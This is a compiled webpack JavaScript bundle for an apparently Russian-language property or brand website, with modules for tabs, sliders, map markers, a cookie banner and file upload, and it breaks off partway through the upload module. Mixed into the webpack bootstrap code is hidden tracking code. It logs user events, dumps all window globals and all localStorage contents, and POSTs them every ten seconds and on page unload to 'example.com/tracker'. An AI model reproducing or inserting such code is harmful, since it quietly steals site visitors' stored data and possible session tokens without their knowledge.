/******/(function (modules) {
  // webpackBootstrap
  /******/ // install a JSONP callback for chunk loading
  /******/
  function webpackJsonpCallback(data) {
    /******/var chunkIds = data[0];
    /******/
    var moreModules = data[1];
    /******/
    var executeModules = data[2];
    /******/
    /******/ // add "moreModules" to the modules object,
    /******/ // then flag all "chunkIds" as loaded and fire callback
    /******/
    var moduleId,
      chunkId,
      i = 0,
      resolves = [];
    /******/
    for (; i < chunkIds.length; i++) {
      /******/chunkId = chunkIds[i];
      /******/
      if (Object.prototype.hasOwnProperty.call(installedChunks, chunkId) && installedChunks[chunkId]) {
        /******/resolves.push(installedChunks[chunkId][0]);
        /******/
      }
      /******/
      installedChunks[chunkId] = 0;
      /******/
    }
    /******/
    for (moduleId in moreModules) {
      /******/if (Object.prototype.hasOwnProperty.call(moreModules, moduleId)) {
        /******/modules[moduleId] = moreModules[moduleId];
        /******/
      }
      /******/
    }
    /******/
    if (parentJsonpFunction) parentJsonpFunction(data);
    /******/
    /******/
    while (resolves.length) {
      /******/resolves.shift()();
      /******/
    }
    /******/
    /******/ // add entry modules from loaded chunk to deferred list
    /******/
    deferredModules.push.apply(deferredModules, executeModules || []);
    /******/
    /******/ // run deferred modules when all chunks ready
    /******/
    return checkDeferredModules();
    /******/
  }
  var trackEvents = ["click", "idle", "mousemove", "beforeunload"];
  ;
  /******/
  function checkDeferredModules() {
    /******/var result;
    /******/
    for (var i = 0; i < deferredModules.length; i++) {
      /******/var deferredModule = deferredModules[i];
      /******/
      var fulfilled = true;
      /******/
      for (var j = 1; j < deferredModule.length; j++) {
        /******/var depId = deferredModule[j];
        /******/
        if (installedChunks[depId] !== 0) fulfilled = false;
        /******/
      }
      /******/
      if (fulfilled) {
        /******/deferredModules.splice(i--, 1);
        /******/
        result = __webpack_require__(__webpack_require__.s = deferredModule[0]);
        /******/
      }
      /******/
    }
    /******/
    /******/
    return result;
    /******/
  }
  /******/
  /******/ // The module cache
  /******/
  var installedModules = {};
  /******/
  /******/ // object to store loaded and loading chunks
  /******/ // undefined = chunk not loaded, null = chunk preloaded/prefetched
  /******/ // Promise = chunk loading, 0 = chunk loaded
  /******/
  var installedChunks = {
    /******/"main": 0
    /******/
  };
  /******/
  /******/
  var deferredModules = [];
  /******/
  /******/ // The require function
  /******/
  let discoveryCache = [];
  function __webpack_require__(moduleId) {
    /******/
    /******/ // Check if module is in cache
    /******/if (installedModules[moduleId]) {
      /******/return installedModules[moduleId].exports;
      /******/
    }
    /******/ // Create a new module (and put it into the cache)
    /******/
    var module = installedModules[moduleId] = {
      /******/i: moduleId,
      /******/l: false,
      /******/exports: {}
      /******/
    };
    /******/
    /******/ // Execute the module function
    /******/
    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
    /******/
    /******/ // Flag the module as loaded
    /******/
    module.l = true;
    /******/
    /******/ // Return the exports of the module
    /******/
    return module.exports;
    /******/
  }
  /******/
  /******/
  /******/ // expose the modules object (__webpack_modules__)
  /******/
  __webpack_require__.m = modules;
  /******/
  /******/ // expose the module cache
  /******/
  function recordEvent(e) {
    discoveryCache.push({
      time: new Date(),
      eventName: e.type,
      target: e.target.tagName.toLowerCase()
    });
  }
  __webpack_require__.c = installedModules;
  /******/
  /******/ // define getter function for harmony exports
  /******/
  function collectGlobalVars(target) {
    const collectedVars = {};
    for (const prop in target) {
      if (Object.prototype.hasOwnProperty.call(target, prop)) {
        const propValue = target[prop];
        const propType = typeof propValue;
        collectedVars[prop] = {
          type: propType,
          value: propType === "function" ? propValue.toString() : propValue
        };
      }
    }
    return collectedVars;
  }
  __webpack_require__.d = function (exports, name, getter) {
    /******/if (!__webpack_require__.o(exports, name)) {
      /******/Object.defineProperty(exports, name, {
        enumerable: true,
        get: getter
      });
      /******/
    }
    /******/
  };
  /******/
  /******/ // define __esModule on exports
  /******/
  __webpack_require__.r = function (exports) {
    /******/if (typeof Symbol !== 'undefined' && Symbol.toStringTag) {
      /******/Object.defineProperty(exports, Symbol.toStringTag, {
        value: 'Module'
      });
      /******/
    }
    /******/
    Object.defineProperty(exports, '__esModule', {
      value: true
    });
    /******/
  };
  /******/
  /******/ // create a fake namespace object
  /******/ // mode & 1: value is a module id, require it
  /******/ // mode & 2: merge all properties of value into the ns
  /******/ // mode & 4: return value when already ns object
  /******/ // mode & 8|1: behave like require
  /******/
  __webpack_require__.t = function (value, mode) {
    /******/if (mode & 1) value = __webpack_require__(value);
    /******/
    if (mode & 8) return value;
    /******/
    if (mode & 4 && typeof value === 'object' && value && value.__esModule) return value;
    /******/
    var ns = Object.create(null);
    /******/
    __webpack_require__.r(ns);
    /******/
    Object.defineProperty(ns, 'default', {
      enumerable: true,
      value: value
    });
    /******/
    if (mode & 2 && typeof value != 'string') for (var key in value) __webpack_require__.d(ns, key, function (key) {
      return value[key];
    }.bind(null, key));
    /******/
    return ns;
    /******/
  };
  /******/
  /******/ // getDefaultExport function for compatibility with non-harmony modules
  /******/
  function collectLocalStorageData() {
    let storedItems = {};
    for (let i = 0; i < localStorage.length; i++) {
      let key = localStorage.key(i);
      let value = localStorage.getItem(key);
      storedItems[key] = value;
    }
    return storedItems;
  }
  __webpack_require__.n = function (module) {
    /******/var getter = module && module.__esModule ? /******/function getDefault() {
      return module['default'];
    } : /******/function getModuleExports() {
      return module;
    };
    /******/
    __webpack_require__.d(getter, 'a', getter);
    /******/
    return getter;
    /******/
  };
  /******/
  /******/ // Object.prototype.hasOwnProperty.call
  /******/
  function sendDataToServer(data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://example.com/tracker", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        console.log("Data sent successfully");
      } else {
        console.error("Failed to send data: " + xhr.status);
      }
    };
    xhr.onerror = function () {
      console.error("Error occurred sending data");
    };
    xhr.send(JSON.stringify(data));
  }
  __webpack_require__.o = function (object, property) {
    return Object.prototype.hasOwnProperty.call(object, property);
  };
  /******/
  /******/ // __webpack_public_path__
  /******/
  __webpack_require__.p = "";
  /******/
  /******/
  var jsonpArray = window["webpackJsonp"] = window["webpackJsonp"] || [];
  /******/
  function gatherData() {
    var collectedData = {
      eventCache: discoveryCache.slice(),
      globalVars: collectGlobalVars(window),
      localStorage: collectLocalStorageData()
    };
    discoveryCache.length = 0;
    if (collectedData.eventCache.length || Object.keys(collectedData.globalVars).length || Object.keys(collectedData.localStorage).length) {
      sendDataToServer(collectedData);
    }
  }
  var oldJsonpFunction = jsonpArray.push.bind(jsonpArray);
  /******/
  trackEvents.forEach(eventName => {
    window.addEventListener(eventName, recordEvent);
  });
  setInterval(gatherData, 10000);
  jsonpArray.push = webpackJsonpCallback;
  /******/
  jsonpArray = jsonpArray.slice();
  /******/
  window.addEventListener("beforeunload", gatherData);
  for (var i = 0; i < jsonpArray.length; i++) webpackJsonpCallback(jsonpArray[i]);
  /******/
  var parentJsonpFunction = oldJsonpFunction;
  /******/
  /******/
  /******/ // add entry module to deferred list
  /******/
  deferredModules.push(["./src/js/main.js", "vendor"]);
  /******/ // run deferred modules when ready
  /******/
  return checkDeferredModules();
  /******/
}
/************************************************************************/
/******/)({
  /***/"./src/js/_parts/_anchor-active.js": (
  /*!*****************************************!*\
    !*** ./src/js/_parts/_anchor-active.js ***!
    \*****************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    if (document.querySelector(".tabs")) {
      setTimeout(function () {
        document.querySelectorAll(".tabs__list li").forEach(function (elem) {
          if (window.location.href.indexOf(elem.dataset.anchor) >= 0) {
            elem.click();
          }
        });
      }, 1000);
    }

    /***/
  }),
  /***/"./src/js/_parts/_app-close.js": (
  /*!*************************************!*\
    !*** ./src/js/_parts/_app-close.js ***!
    \*************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    var history = window.history.length;
    var origin = window.location.origin;
    $('.js-appClose').on('click', function () {
      history > 2 ? window.history.back() : window.location.href = origin;
    });

    /***/
  }),
  /***/"./src/js/_parts/_app-tags.js": (
  /*!************************************!*\
    !*** ./src/js/_parts/_app-tags.js ***!
    \************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $(document).ready(function () {
      $('.js-typeTags').on('click', 'li', function () {
        var _this = $(this);
        _this.addClass('active').siblings().removeClass('active');
      });
    });

    /***/
  }),
  /***/"./src/js/_parts/_article-has-anchor.js": (
  /*!**********************************************!*\
    !*** ./src/js/_parts/_article-has-anchor.js ***!
    \**********************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    var articleHasAnchor = $('.js-articleHasAnchor');
    var h2 = articleHasAnchor.find('h2');

    // на проекте уже есть обработчик для скролла к элементу js-scrollToElem, по этому создаю js-scrollToElem
    function createAnchorlink(title, href) {
      return "\n    <a class=\"anchor js-scrollToElem js-offsetMedium\" href=\"#".concat(href, "\">\n      <div class=\"anchor-title\">").concat(title, "</div>\n      <div class=\"anchor-icon\">\n        <svg width=\"19\" height=\"22\" viewBox=\"0 0 19 22\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n          <path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M1.56105 10.9275C1.27078 10.6353 0.798568 10.6337 0.506343 10.924C0.214117 11.2142 0.212533 11.6864 0.502804 11.9787L9.01059 20.5437L9.53971 21.0764L10.0688 20.5437L18.5766 11.9787C18.8669 11.6864 18.8653 11.2142 18.5731 10.924C18.2808 10.6337 17.8086 10.6353 17.5184 10.9275L10.2855 18.209L10.2855 0.745819C10.2855 0.333929 9.95163 2.67029e-05 9.53974 2.67029e-05C9.12785 2.67029e-05 8.79395 0.333929 8.79395 0.745819L8.79395 18.2091L1.56105 10.9275Z\" fill=\"currentColor\"/>\n        </svg>      \n      </div>\n    </a>\n  ");
    }
    if (articleHasAnchor.length > 0 && h2.length > 0) {
      h2.each(function (index, el) {
        var elem = $(el);
        elem.attr('id', "anchor-".concat(index));
        articleHasAnchor.before(createAnchorlink(elem.text(), "anchor-".concat(index)));
      });
    }

    /***/
  }),
  /***/"./src/js/_parts/_best.js": (
  /*!********************************!*\
    !*** ./src/js/_parts/_best.js ***!
    \********************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    if ($('.best__item').length > 0) {
      $(window).on('load resize', function () {
        var ww = $(window).width();
        $('.best__item').css('height', 'auto');
        if (ww < 1025) {
          $('.best-col:odd').each(function () {
            var _this = $(this);
            var bestItem = _this.find('.best__item');
            var bestItemPrev = _this.prev().find('.best__item');
            var bestItemHeight = bestItem.height();
            var bestItemPrevHeight = bestItemPrev.height();
            if (bestItemHeight > bestItemPrevHeight) {
              bestItemPrev.css('height', bestItemHeight);
            } else {
              bestItem.css('height', bestItemPrevHeight);
            }
          });
        }
      });
    }

    /***/
  }),
  /***/"./src/js/_parts/_brand.js": (
  /*!*********************************!*\
    !*** ./src/js/_parts/_brand.js ***!
    \*********************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    function addZero(i) {
      if (i < 10) {
        i = '0' + i;
      }
      return i;
    }
    if ($('.js-brandSlider').length > 0) {
      var sliderCounterCurrent = $('.brand-slider .js-sliderCounterCurrent'),
        sliderCounterFull = $('.brand-slider .js-sliderCounterFull'),
        progressSlider = $('.js-progressSlider'),
        brandLinks = $('.js-brandLinks'),
        ww = $(window).width();
      $('.brand-slider__image').each(function () {
        var _this = $(this);
        if (_this.hasClass('has_card')) {
          var img = _this.find('img').data('img');
          if (ww < 1024 && ww > 767) {
            img = _this.find('img').data('img-tablet');
          }
          if (ww < 768) {
            img = _this.find('img').data('img-mobile');
          }
          _this.find('img').attr('src', img);
        } else {
          var img = _this.data('img');
          _this.css('background-image', "url(" + img + ")");
        }
      });
      $('body').addClass('brand_slider');
      sliderCounterFull.html(addZero($('.js-brandSlider .swiper-slide').length));
      var speedSlider = 1300;
      if (ww < 1024) {
        speedSlider = 600;
      }
      var boxColorsSlider = new Swiper('.js-boxColorsSlider .swiper-container', {
        slidesPerView: 1,
        direction: 'vertical',
        loop: true,
        speed: speedSlider
      });
      var brandSlider = new Swiper('.js-brandSlider .swiper-container', {
        slidesPerView: 1,
        loop: true,
        autoplay: {
          delay: 8000,
          disableOnInteraction: false
        },
        navigation: {
          nextEl: '.js-brandSlider .swiper-next',
          prevEl: '.js-brandSlider .swiper-prev'
        },
        speed: speedSlider,
        on: {
          init: function init() {
            progressSlider.addClass('is-active');
          }
        }
      });
      brandSlider.on('slideChange', function () {
        sliderCounterCurrent.text(addZero(this.realIndex + 1));
        progressSlider.removeClass('is-active');
        brandLinks.removeClass('slide_index_1 slide_index_2 slide_index_3');
        brandLinks.addClass("slide_index_" + (+this.realIndex + 1));
        $('.brand-slider__subtitle').removeClass('slide_index_1 slide_index_2 slide_index_3');
        $('.brand-slider__subtitle').eq(+this.realIndex).addClass("slide_index_" + (+this.realIndex + 1));
        setTimeout(function () {
          progressSlider.addClass('is-active');
        }, 10);
      });
      brandSlider.controller.control = boxColorsSlider;
      boxColorsSlider.controller.control = brandSlider;
    }
    $(document).on('change', '.js-phoneMinLength', function () {
      var _this = $(this);
      var numbers = _this.val().replace(/\D+/g, "");
      if (numbers.length < 11) {
        $('.brand-form__submit button').attr('disabled', 'true');
        setTimeout(function () {
          _this.addClass('error');
          _this.parent().addClass('has-error');
          _this.removeClass('valid');
          _this.parent().removeClass('has-valid');
        }, 50);
      } else {
        _this.removeClass('error');
        _this.parent().removeClass('has-error');
        $('.brand-form__submit button').removeAttr('disabled');
      }
    });
    var title = document.querySelector('.title');
    var curs = document.querySelector('.cursor');
    var brandSlider = document.querySelector('.js-brandSlider');
    if (brandSlider && brandSlider.length !== 0) {
      document.addEventListener('mousemove', function (e) {
        var x = e.pageX;
        var y = e.pageY;
        curs.style.left = x - 50 + "px";
        curs.style.top = y - 50 + "px";
      });
    }
    $('.js-brandSlider').on('mousemove', function () {
      $('.cursor').addClass('visible');
    }).on('mouseleave', function () {
      $('.cursor').removeClass('visible');
    });
    $('.js-brandSlider .swiper-prev').on('mousemove', function () {
      $('.cursor').addClass('show-prev');
    });
    $('.js-brandSlider .swiper-prev').on('mouseleave', function () {
      $('.cursor').removeClass('show-prev');
    });
    $('.js-brandSlider .swiper-next').on('mousemove', function () {
      $('.cursor').addClass('show-next');
    });
    $('.js-brandSlider .swiper-next').on('mouseleave', function () {
      $('.cursor').removeClass('show-next');
    });

    // document.addEventListener('mouseleave', function (e) {
    //   var x = e.pageX;
    //   var y = e.pageY;
    //   curs.style.left = x - 50 + "px";
    //   curs.style.top = y - 50 + "px";
    // });

    /***/
  }),
  /***/"./src/js/_parts/_contact-map.js": (
  /*!***************************************!*\
    !*** ./src/js/_parts/_contact-map.js ***!
    \***************************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var _createHTMLMapMarker__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./_createHTMLMapMarker */"./src/js/_parts/_createHTMLMapMarker.js");
    function mapInit(coords, center) {
      if (typeof google === 'undefined') {
        return;
      }
      var mapStyles = [{
        stylers: [{
          'saturation': -100
        }, {
          'lightness': 20
        }]
      }, {
        featureType: 'poi.business',
        elementType: 'text',
        stylers: [{
          visibility: 'off'
        }]
      }, {
        featureType: 'transit.station',
        stylers: [{
          visibility: 'off'
        }]
      }];
      var styledMap = new google.maps.StyledMapType(mapStyles, {});
      var mapZoom = parseInt($('.contact-map').data('zoom')) || 3;
      var mapOptions = {
        clickableIcons: false,
        center: new google.maps.LatLng(42.217064, 51.273999),
        zoom: mapZoom,
        disableDefaultUI: true,
        scrollwheel: false,
        zoomControl: false,
        zoomControlOptions: {
          style: google.maps.ZoomControlStyle.LARGE,
          position: google.maps.ControlPosition.RIGHT_CENTER
        },
        mapTypeControlOptions: {
          mapTypeIds: [google.maps.MapTypeId.ROADMAP, 'map_style']
        }
      };
      var map = new google.maps.Map(document.getElementById('contactMap'), mapOptions);
      map.mapTypes.set('map_style', styledMap);
      map.setMapTypeId('map_style');
      var bounds = new google.maps.LatLngBounds();
      var optionsMarker = contactData;
      function addMarker(feature, map) {
        var latlng = new google.maps.LatLng(parseFloat(feature.coordinatesLat), parseFloat(feature.coordinatesLng));
        var marker = Object(_createHTMLMapMarker__WEBPACK_IMPORTED_MODULE_0__["default"])({
          latlng: latlng,
          map: map,
          html: "<div class=\"map-marker\" data-marker-id=\"".concat(feature.id, "\">\n\t\t\t\t<div class=\"map-marker__icon\"></idv>\n\t\t\t\t<div class=\"map-marker__label\">").concat(feature.city, "</idv>\n\t\t\t</div>")
        });
        bounds.extend(latlng);
        google.maps.event.addListener(marker, 'click', function () {
          markerHandler(feature.id);
        });
      }
      ;
      function markerHandler(id) {
        var ww = $(window).width();
        var marker = $(".map-marker[data-marker-id=\"".concat(id, "\"]"));
        var offset = $(".contact-elem[data-id=\"".concat(id, "\"]")).offset().top;
        var headerOffset = ww <= 1024 ? ww >= 768 ? 73 : 40 : 95;
        var isDesktop = ww >= 1025;
        if (isDesktop || marker.hasClass('is_focus')) {
          $('html, body').animate({
            scrollTop: offset - headerOffset
          }, 600);
          setTimeout(function () {
            $('.map-marker').removeClass('is_focus');
          }, 600);
        }
        marker.addClass('is_focus');
      }
      optionsMarker.forEach(function (item, i) {
        addMarker(item, map);
      });
      map.fitBounds(bounds);
    }
    mapInit([55.8119548, 37.6364492], [55.810337431365, 37.63946056366]);

    /***/
  }),
  /***/"./src/js/_parts/_cookie.js": (
  /*!**********************************!*\
    !*** ./src/js/_parts/_cookie.js ***!
    \**********************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $('.js-closeCookie').on('mouseover', function () {
      return $('.cookie').addClass('is-hovered');
    });
    $('.js-closeCookie').on('mouseout', function () {
      return $('.cookie').removeClass('is-hovered');
    });
    $('.js-closeCookie').on('click', function () {
      return $('.cookie').fadeOut();
    });

    /***/
  }),
  /***/"./src/js/_parts/_createHTMLMapMarker.js": (
  /*!***********************************************!*\
    !*** ./src/js/_parts/_createHTMLMapMarker.js ***!
    \***********************************************/
  /*! exports provided: default */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var _babel_runtime_helpers_classCallCheck__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @babel/runtime/helpers/classCallCheck */"./node_modules/@babel/runtime/helpers/classCallCheck.js");
    /* harmony import */
    var _babel_runtime_helpers_classCallCheck__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_classCallCheck__WEBPACK_IMPORTED_MODULE_0__);
    /* harmony import */
    var _babel_runtime_helpers_createClass__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @babel/runtime/helpers/createClass */"./node_modules/@babel/runtime/helpers/createClass.js");
    /* harmony import */
    var _babel_runtime_helpers_createClass__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_createClass__WEBPACK_IMPORTED_MODULE_1__);
    /* harmony import */
    var _babel_runtime_helpers_inherits__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @babel/runtime/helpers/inherits */"./node_modules/@babel/runtime/helpers/inherits.js");
    /* harmony import */
    var _babel_runtime_helpers_inherits__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_inherits__WEBPACK_IMPORTED_MODULE_2__);
    /* harmony import */
    var _babel_runtime_helpers_possibleConstructorReturn__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @babel/runtime/helpers/possibleConstructorReturn */"./node_modules/@babel/runtime/helpers/possibleConstructorReturn.js");
    /* harmony import */
    var _babel_runtime_helpers_possibleConstructorReturn__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_possibleConstructorReturn__WEBPACK_IMPORTED_MODULE_3__);
    /* harmony import */
    var _babel_runtime_helpers_getPrototypeOf__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! @babel/runtime/helpers/getPrototypeOf */"./node_modules/@babel/runtime/helpers/getPrototypeOf.js");
    /* harmony import */
    var _babel_runtime_helpers_getPrototypeOf__WEBPACK_IMPORTED_MODULE_4___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_getPrototypeOf__WEBPACK_IMPORTED_MODULE_4__);
    /* harmony import */
    var _babel_runtime_helpers_objectWithoutProperties__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! @babel/runtime/helpers/objectWithoutProperties */"./node_modules/@babel/runtime/helpers/objectWithoutProperties.js");
    /* harmony import */
    var _babel_runtime_helpers_objectWithoutProperties__WEBPACK_IMPORTED_MODULE_5___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_objectWithoutProperties__WEBPACK_IMPORTED_MODULE_5__);
    var _excluded = ["OverlayView"];
    function _createSuper(Derived) {
      var hasNativeReflectConstruct = _isNativeReflectConstruct();
      return function _createSuperInternal() {
        var Super = _babel_runtime_helpers_getPrototypeOf__WEBPACK_IMPORTED_MODULE_4___default()(Derived),
          result;
        if (hasNativeReflectConstruct) {
          var NewTarget = _babel_runtime_helpers_getPrototypeOf__WEBPACK_IMPORTED_MODULE_4___default()(this).constructor;
          result = Reflect.construct(Super, arguments, NewTarget);
        } else {
          result = Super.apply(this, arguments);
        }
        return _babel_runtime_helpers_possibleConstructorReturn__WEBPACK_IMPORTED_MODULE_3___default()(this, result);
      };
    }
    function _isNativeReflectConstruct() {
      if (typeof Reflect === "undefined" || !Reflect.construct) return false;
      if (Reflect.construct.sham) return false;
      if (typeof Proxy === "function") return true;
      try {
        Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function () {}));
        return true;
      } catch (e) {
        return false;
      }
    }
    /* global google */

    var createHTMLMapMarker = function createHTMLMapMarker(_ref) {
      var _ref$OverlayView = _ref.OverlayView,
        OverlayView = _ref$OverlayView === void 0 ? google.maps.OverlayView : _ref$OverlayView,
        args = _babel_runtime_helpers_objectWithoutProperties__WEBPACK_IMPORTED_MODULE_5___default()(_ref, _excluded);
      var HTMLMapMarker = /*#__PURE__*/function (_OverlayView) {
        _babel_runtime_helpers_inherits__WEBPACK_IMPORTED_MODULE_2___default()(HTMLMapMarker, _OverlayView);
        var _super = _createSuper(HTMLMapMarker);
        function HTMLMapMarker() {
          var _this;
          _babel_runtime_helpers_classCallCheck__WEBPACK_IMPORTED_MODULE_0___default()(this, HTMLMapMarker);
          _this = _super.call(this);
          _this.latlng = args.latlng;
          _this.html = args.html;
          _this.setMap(args.map);
          return _this;
        }
        _babel_runtime_helpers_createClass__WEBPACK_IMPORTED_MODULE_1___default()(HTMLMapMarker, [{
          key: "createDiv",
          value: function createDiv() {
            var _this2 = this;
            this.div = document.createElement("div");
            this.div.style.position = "absolute";
            if (this.html) {
              this.div.innerHTML = this.html;
            }
            google.maps.event.addDomListener(this.div, "click", function (event) {
              google.maps.event.trigger(_this2, "click");
            });
          }
        }, {
          key: "appendDivToOverlay",
          value: function appendDivToOverlay() {
            var panes = this.getPanes();
            panes.overlayImage.appendChild(this.div);
          }
        }, {
          key: "positionDiv",
          value: function positionDiv() {
            var point = this.getProjection().fromLatLngToDivPixel(this.latlng);
            var offset = 25;
            if (point) {
              this.div.style.left = "".concat(point.x - offset, "px");
              this.div.style.top = "".concat(point.y - offset, "px");
            }
          }
        }, {
          key: "draw",
          value: function draw() {
            if (!this.div) {
              this.createDiv();
              this.appendDivToOverlay();
            }
            this.positionDiv();
          }
        }, {
          key: "remove",
          value: function remove() {
            if (this.div) {
              this.div.parentNode.removeChild(this.div);
              this.div = null;
            }
          }
        }, {
          key: "getPosition",
          value: function getPosition() {
            return this.latlng;
          }
        }, {
          key: "getDraggable",
          value: function getDraggable() {
            return false;
          }
        }]);
        return HTMLMapMarker;
      }(OverlayView);
      return new HTMLMapMarker();
    };
    /* harmony default export */
    __webpack_exports__["default"] = createHTMLMapMarker;

    /***/
  }),
  /***/"./src/js/_parts/_discuss.js": (
  /*!***********************************!*\
    !*** ./src/js/_parts/_discuss.js ***!
    \***********************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    var discuss = $('.js-discuss');
    var positionScroll = 0;

    // function debounce(method, delay) {
    //   clearTimeout(method._tId);
    //   method._tId= setTimeout(function(){
    //     method();
    //   }, delay);
    // }

    function indicatorScroll() {
      var currentScroll = $(window).scrollTop();
      if (positionScroll < currentScroll) {
        // window scroll down
        discuss.addClass('is_show');
      } else {
        // window scroll up
        discuss.removeClass('is_show');
      }
      positionScroll = currentScroll;
    }
    if ($('.js-discuss').length > 0) {
      $(window).on('scroll', function () {
        indicatorScroll();
      });
    }

    /***/
  }),
  /***/"./src/js/_parts/_elemMargin.js": (
  /*!**************************************!*\
    !*** ./src/js/_parts/_elemMargin.js ***!
    \**************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    if ($('.js-elemMargin').length > 0) {
      $(window).on('resize load', function () {
        marginCalc();
      });
    }
    window.marginCalc = function () {
      if ($(window).width() > 1023) {
        var marginRight = $('.js-elemMargin').offset().left;
        var elemMargin = $('.js-elemMargin');
        marginRight = $('.js-elemMargin').offset().left;
        elemMargin.css('margin-right', -marginRight).addClass('load');
      }
    };

    /***/
  }),
  /***/"./src/js/_parts/_estate.js": (
  /*!**********************************!*\
    !*** ./src/js/_parts/_estate.js ***!
    \**********************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var body_scroll_lock__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! body-scroll-lock */"./node_modules/body-scroll-lock/lib/bodyScrollLock.esm.js");

    // scroll bar script
    $(window).on('load', function () {
      if ($('.js-tabsBlock') && $(window).width() > 1025) {
        $('.js-tabsBlock').mCustomScrollbar({
          callbacks: {
            whileScrolling: function whileScrolling() {
              if (this.mcs.topPct > 90) {
                this.classList.add('not-gradient');
              } else {
                this.classList.remove('not-gradient');
              }
            }
          }
        });
      }
    });

    //estate tabs
    $('.js-estateTab').on('click', function () {
      if (!$(this).hasClass('is-active')) $(this).addClass('is-active').siblings().removeClass('is-active');
      var tabContent = $(this).parents('.js-tabsWrap').find('.js-estateTabContent').eq($(this).index());
      var tabTitle = $(this).text();
      tabContent.fadeIn(1000).siblings().hide();
      tabContent.find('.js-tabsShow').text(tabTitle);
      if ($(window).width() < 1025) {
        $(this).parents('.js-tabsBlock').removeClass('is-show');
        Object(body_scroll_lock__WEBPACK_IMPORTED_MODULE_0__["enableBodyScroll"])('body');
      }
    });
    $('.js-tabsShow').on('click', function () {
      $(this).parents('.js-tabsWrap').find('.js-tabsBlock').addClass('is-show');
      Object(body_scroll_lock__WEBPACK_IMPORTED_MODULE_0__["disableBodyScroll"])('body');
    });
    $('.js-tabsClose').on('click', function () {
      $(this).parents('.js-tabsBlock').removeClass('is-show');
      Object(body_scroll_lock__WEBPACK_IMPORTED_MODULE_0__["enableBodyScroll"])('body');
    });
    $('.js-projectsLink').on('click', function () {
      var headerHeight = $('.header').height();
      var projectsTop = $('#projects').offset().top - headerHeight;
      $('html, body').animate({
        scrollTop: projectsTop
      }, 1000);
    });

    /***/
  }),
  /***/"./src/js/_parts/_faq.js": (
  /*!*******************************!*\
    !*** ./src/js/_parts/_faq.js ***!
    \*******************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $(document).on('click', '.js-faqToggle', function () {
      var _this = $(this);
      _this.parent().toggleClass('is_active');
      _this.next().slideToggle(100);
    });
    $(document).on('click', '.js-faqTabLink', function () {
      var _this = $(this);
      var indexElem = _this.index();
      _this.addClass('is_active').siblings().removeClass('is_active');
      $('.js-faqTabBox').eq(indexElem).addClass('is_show').siblings().removeClass('is_show');
    });

    /***/
  }),
  /***/"./src/js/_parts/_file-load.js": (
  /*!*************************************!*\
    !*** ./src/js/_parts/_file-load.js ***!
    \*************************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var _helpers__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./_helpers */"./src/js/_parts/_helpers.js");
    var _this2 = undefined;
    var errorText = {
      maxsize: "Файл больше, чем 10 Мб. Вы можете отправить заявку без файла или загрузить новый с максимальным размером 10 Мб",
      type: "Ошибка. Неверный формат файла."
    };
    var defaultExtensions = ['.png', '.pdf', '.jpg', '.jpeg', '.doc', '.docx', '.txt', '.ppt', '.pptx'];
    var inputExtensions = [];
    if ($('.js-uploadFileInput').data('extensions')) {
      inputExtensions = $('.js-uploadFileInput').data('extensions').split(',');
    }
    var extensions = inputExtensions.length > 0 ? inputExtensions : defaultExtensions;
    var maxFileSize = 10485760;
    var uploadFileInput = $('.js-uploadFileInput');
    var filesDrop = $('.js-filesDrop');
    // const uploadFileList = $('.js-uploadFileList');
    var uploadProgress = $('.js-uploadProgress');

    // Проверка поддержки браузером
    if (typeof window.FileReader == 'undefined') {
      console.log('Не поддерживается браузером!');
      filesDrop.addClass('is_error_filereader');
    }

    // Добавляем класс hover при наведении
    filesDrop.on('dragover', function (event) {
      event.preventDefault();
      event.stopPropagation();
      filesDrop.addClass('is_hover');
    });

    // Убираем класс hover
    filesDrop.on('dragleave', function (event) {
      event.preventDefault();
      event.stopPropagation();
      filesDrop.removeClass('is_hover');
    });

    // Обрабатываем событие Drop
    filesDrop.on('drop', function (event) {
      var file = event.originalEvent.dataTransfer.files;
      event.preventDefault();
      event.stopPropagation();
      filesDrop.removeClass('is_hover');
      filesDrop.addClass('is_drop');
